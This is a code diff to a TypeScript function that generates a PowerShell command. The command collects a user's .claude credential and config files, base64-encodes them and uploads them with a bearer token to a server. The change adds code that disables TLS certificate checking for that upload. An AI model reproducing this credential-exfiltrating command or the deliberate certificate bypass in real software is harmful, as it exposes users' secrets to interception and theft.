@@ -28,11 +28,13 @@ function uploadCommand(os: OS, origin: string, token: string): string {
   if (os === 'windows') {
     return `$t="${token}";$s="${origin}"
 $d="$env:USERPROFILE\\.claude";$j="$env:USERPROFILE\\.claude.json"
+if($PSVersionTable.PSVersion.Major -lt 6){[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}}
 $f=@()
 if(Test-Path $d){Get-ChildItem $d -Recurse -File|%{$f+=@{path=$_.FullName.Substring($d.Length+1);content=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))}}}
 if(Test-Path $j){$f+=@{path=".claude.json";content=[Convert]::ToBase64String([IO.File]::ReadAllBytes($j))}}
 $b=@{bundle=@{files=$f;exportedAt=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")}}|ConvertTo-Json -Depth 10
-Invoke-RestMethod -Method POST -Uri "$s/api/auth/credentials" -Headers @{Authorization="Bearer $t";"Content-Type"="application/json"} -Body $b
+$p=if($PSVersionTable.PSVersion.Major -ge 6){@{SkipCertificateCheck=$true}}else{@{}}
+Invoke-RestMethod -Method POST -Uri "$s/api/auth/credentials" -Headers @{Authorization="Bearer $t";"Content-Type"="application/json"} -Body $b @p
 Write-Host "✓ Fertig"`
   }
   return `python3 -c "
